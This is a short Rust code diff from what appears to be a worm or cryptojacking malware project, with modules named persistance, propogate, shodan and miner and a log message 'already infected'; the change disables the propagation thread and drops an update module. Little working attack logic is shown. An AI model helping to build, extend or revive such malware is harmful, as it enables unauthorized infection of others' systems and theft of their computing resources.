@@ -1,7 +1,6 @@
 mod persistance;
 mod propogate;
 mod network;
-mod update;
 mod shodan;
 mod miner;
 mod mutex;
@@ -34,13 +33,13 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
             let mut network = Network::new();
 
-            let propogate = propogate::spawn(network.should_close());
+            // let propogate = propogate::spawn(network.should_close());
 
-            network.run()?;
+            network.run();
 
             info!("waiting for propogate to finish");
 
-            let _ = propogate.join();
+            // let _ = propogate.join();
         },
         None => {
             warn!("already infected");
